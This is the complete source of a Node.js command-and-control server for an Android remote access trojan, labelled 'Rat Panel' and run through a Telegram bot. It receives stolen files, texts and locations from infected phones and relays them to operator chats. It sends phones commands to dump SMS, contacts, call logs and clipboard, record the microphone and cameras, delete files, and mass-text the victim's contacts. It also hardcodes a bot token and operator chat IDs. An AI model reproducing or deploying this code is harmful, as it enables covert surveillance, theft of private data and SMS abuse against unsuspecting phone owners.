const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

// ============================================
// CONFIGURATION
// ============================================
const token = '8756594471:AAHTdrMFFTXlBXA2L-mSy2BWItas-J_X_Zw';
const ids = ['8408378910', '8339602080']; // Authorized chat IDs

const PORT = process.env.PORT || 3000;
// Railway ka external URL (automatic detect ya manually set)
const RAILWAY_URL = process.env.RAILWAY_PUBLIC_DOMAIN || process.env.RAILWAY_URL;

// ============================================

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });

// ✅ WEBHOOK setup for Railway (polling se better)
let appBot;
if (RAILWAY_URL) {
    // Production: Webhook use karo
    const webhookUrl = `https://${RAILWAY_URL}/bot${token}`;
    appBot = new telegramBot(token, { webHook: { port: false } });
    appBot.setWebHook(webhookUrl);
    console.log('✅ Webhook mode enabled:', webhookUrl);
} else {
    // Local development: Polling
    appBot = new telegramBot(token, { polling: true });
    console.log('⚠️ Polling mode (local only)');
}

const appClients = new Map();
const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// ✅ FIXED: Pehla ID as default admin
const primaryId = ids[0];

// Helper functions
function sendToAllIds(message, options = {}) {
    ids.forEach(id => {
        appBot.sendMessage(id, message, options).catch(err => {
            console.error(`Failed to send to ${id}:`, err.message);
        });
    });
}

function sendDocumentToAllIds(document, options = {}, fileOptions = {}) {
    ids.forEach(id => {
        appBot.sendDocument(id, document, options, fileOptions).catch(err => {
            console.error(`Failed to send doc to ${id}:`, err.message);
        });
    });
}

function sendLocationToAllIds(lat, lon, options = {}) {
    ids.forEach(id => {
        appBot.sendLocation(id, lat, lon, options).catch(err => {
            console.error(`Failed to send location to ${id}:`, err.message);
        });
    });
}

// Webhook endpoint
app.use(`/bot${token}`, (req, res) => {
    appBot.processUpdate(req.body);
    res.sendStatus(200);
});

// Health check endpoint (Railway ke liye zaroori)
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        connections: appClients.size,
        uptime: process.uptime()
    });
});

app.get('/', (req, res) => {
    res.send(`
        <h1 align="center">✅ Server Running</h1>
        <p>Connections: ${appClients.size}</p>
        <p>Uptime: ${Math.floor(process.uptime())}s</p>
    `);
});

// File upload endpoint
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        const name = req.file.originalname;
        sendDocumentToAllIds(
            req.file.buffer,
            {
                caption: `📱 <b>${req.headers.model}</b>\n📁 File received`,
                parse_mode: "HTML"
            },
            { filename: name, contentType: 'application/octet-stream' }
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Upload error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Text upload endpoint
app.post("/uploadText", (req, res) => {
    try {
        const text = req.body['text'];
        
        // Filter
        if (text && text.toLowerCase().includes('shivayadavv')) {
            console.log('Filtered: developer tag found');
            return res.json({ filtered: true });
        }
        
        sendToAllIds(
            `📱 <b>${req.headers.model}</b>\n💬 ${text}`, 
            { parse_mode: "HTML" }
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Text upload error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Location upload endpoint
app.post("/uploadLocation", (req, res) => {
    try {
        sendLocationToAllIds(req.body['lat'], req.body['lon']);
        sendToAllIds(
            `📍 Location from <b>${req.headers.model}</b>`, 
            { parse_mode: "HTML" }
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Location error:', err);
        res.status(500).json({ error: err.message });
    }
});

// WebSocket connection
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const { model, battery, version, brightness, provider } = req.headers;
    
    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model || 'Unknown',
        battery: battery || 'N/A',
        version: version || 'N/A',
        brightness: brightness || 'N/A',
        provider: provider || 'N/A',
        connectedAt: new Date()
    });

    sendToAllIds(
        `🔴 <b>New Device Connected</b>\n\n` +
        `📱 Model: <code>${model || 'Unknown'}</code>\n` +
        `🔋 Battery: <b>${battery || 'N/A'}</b>\n` +
        `🤖 Android: <b>${version || 'N/A'}</b>\n` +
        `☀️ Brightness: <b>${brightness || 'N/A'}</b>\n` +
        `📡 Provider: <b>${provider || 'N/A'}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', () => {
        const client = appClients.get(uuid);
        sendToAllIds(
            `⚫ <b>Device Disconnected</b>\n\n` +
            `📱 Model: <code>${client?.model || 'Unknown'}</code>`,
            { parse_mode: "HTML" }
        );
        appClients.delete(uuid);
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
    });
});

// Bot message handler
appBot.on('message', (message) => {
    const chatId = message.chat.id.toString();
    
    // ✅ FIXED: Authorization check
    if (!ids.includes(chatId)) {
        return appBot.sendMessage(chatId, '⛔ <b>Permission Denied</b>', { parse_mode: "HTML" });
    }

    // Reply handlers
    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text;
        
        if (replyText.includes('number to which you want to send the SMS')) {
            currentNumber = message.text;
            currentUuid = extractUuid(replyText);
            
            return appBot.sendMessage(chatId,
                '✉️ Enter the message to send:',
                { reply_markup: { force_reply: true } }
            );
        }
        
        if (replyText.includes('Enter the message to send')) {
            const targetUuid = currentUuid || extractUuid(replyText);
            
            appSocket.clients.forEach(ws => {
                if (ws.uuid === targetUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            
            return sendToAllIds('✅ SMS request sent!');
        }

        // Add other reply handlers similarly...
    }

    // Command handlers
    if (message.text === '/start') {
        return appBot.sendMessage(chatId,
            `🤖 <b>Welcome to Rat Panel</b>\n\n` +
            `📊 Connected Devices: <b>${appClients.size}</b>\n\n` +
            `Use buttons below to control devices.`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚡ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }

    if (message.text === '📱 Connected Devices') {
        if (appClients.size === 0) {
            return appBot.sendMessage(chatId, '❌ No devices connected');
        }
        
        let text = '📱 <b>Connected Devices:</b>\n\n';
        appClients.forEach((value, key) => {
            text += `├─ <b>${value.model}</b>\n`;
            text += `│  🔋 ${value.battery} | 🤖 ${value.version}\n`;
            text += `│  📡 ${value.provider}\n\n`;
        });
        
        return appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
    }

    if (message.text === '⚡ Execute Command') {
        if (appClients.size === 0) {
            return appBot.sendMessage(chatId, '❌ No devices available');
        }

        const keyboard = [];
        appClients.forEach((value, key) => {
            keyboard.push([{ text: value.model, callback_data: `device:${key}` }]);
        });

        return appBot.sendMessage(chatId, '⚡ Select device:', {
            reply_markup: { inline_keyboard: keyboard }
        });
    }
});

// Callback query handler
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');
    
    if (!ids.includes(msg.chat.id.toString())) return;

    if (command === 'device') {
        const client = appClients.get(uuid);
        if (!client) {
            return appBot.editMessageText('❌ Device disconnected', {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            });
        }

        appBot.editMessageText(
            `⚡ <b>Commands for ${client.model}</b>`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📱 Apps', callback_data: `apps:${uuid}` },
                            { text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: '📁 Get File', callback_data: `get_file:${uuid}` },
                            { text: '🗑️ Delete File', callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: '📋 Clipboard', callback_data: `clipboard:${uuid}` },
                            { text: '🎤 Microphone', callback_data: `microphone:${uuid}` }
                        ],
                        [
                            { text: '📷 Main Camera', callback_data: `camera_main:${uuid}` },
                            { text: '🤳 Selfie Camera', callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: '📍 Location', callback_data: `location:${uuid}` },
                            { text: '🍞 Toast', callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: '📞 Calls', callback_data: `calls:${uuid}` },
                            { text: '👥 Contacts', callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: '📳 Vibrate', callback_data: `vibrate:${uuid}` },
                            { text: '🔔 Notification', callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: '💬 Messages', callback_data: `messages:${uuid}` },
                            { text: '✉️ Send SMS', callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: '▶️ Play Audio', callback_data: `play_audio:${uuid}` },
                            { text: '⏹️ Stop Audio', callback_data: `stop_audio:${uuid}` }
                        ],
                        [
                            { text: '📢 SMS to All Contacts', callback_data: `send_message_to_all:${uuid}` }
                        ]
                    ]
                }
            }
        );
    }

    // Simple command handlers
    const simpleCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 
                           'clipboard', 'camera_main', 'camera_selfie', 'location', 
                           'vibrate', 'stop_audio'];
    
    if (simpleCommands.includes(command)) {
        appSocket.clients.forEach(ws => {
            if (ws.uuid === uuid) ws.send(command);
        });
        
        appBot.answerCallbackQuery(callbackQuery.id, { text: '✅ Command sent!' });
        
        return sendToAllIds(
            `⏳ <b>Command Executed</b>: ${command}\n` +
            `📱 Target: <code>${uuid.slice(0, 8)}...</code>`,
            { parse_mode: "HTML" }
        );
    }

    // Parameter commands
    if (command === 'send_message') {
        return appBot.sendMessage(msg.chat.id,
            '✉️ <b>Send SMS</b>\n\nEnter number with country code:\n<code>+91xxxxxxxxxx</code>',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'send_message_to_all') {
        return appBot.sendMessage(msg.chat.id,
            '📢 <b>Broadcast SMS</b>\n\nEnter message for all contacts:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'get_file') {
        return appBot.sendMessage(msg.chat.id,
            '📁 <b>Download File</b>\n\nEnter path:\n<code>/DCIM/Camera/</code>',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'delete_file') {
        return appBot.sendMessage(msg.chat.id,
            '🗑️ <b>Delete File</b>\n\nEnter file path:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'microphone') {
        return appBot.sendMessage(msg.chat.id,
            '🎤 <b>Record Audio</b>\n\nEnter duration in seconds:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'camera_main' || command === 'camera_selfie') {
        return appBot.sendMessage(msg.chat.id,
            `📷 <b>Record ${command === 'camera_selfie' ? 'Selfie' : 'Main'} Camera</b>\n\nEnter duration (seconds):`,
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'toast') {
        return appBot.sendMessage(msg.chat.id,
            '🍞 <b>Show Toast</b>\n\nEnter message:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'show_notification') {
        return appBot.sendMessage(msg.chat.id,
            '🔔 <b>Show Notification</b>\n\nEnter title:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }

    if (command === 'play_audio') {
        return appBot.sendMessage(msg.chat.id,
            '▶️ <b>Play Audio</b>\n\nEnter audio URL:',
            { 
                parse_mode: "HTML",
                reply_markup: { force_reply: true } 
            }
        );
    }
});

// Helper function
function extractUuid(text) {
    const match = text.match(/device:([a-f0-9-]+)/i);
    return match ? match[1] : currentUuid;
}

// Error handling
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});

// ✅ FIXED: Proper Railway binding
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔════════════════════════════════════╗
    ║     🚀 Server Started Successfully   ║
    ╠════════════════════════════════════╣
    ║  Port:     ${PORT}                    ║
    ║  Mode:     ${RAILWAY_URL ? 'Webhook' : 'Polling'}              ║
    ║  Health:   /health                  ║
    ╚════════════════════════════════════╝
    `);
});
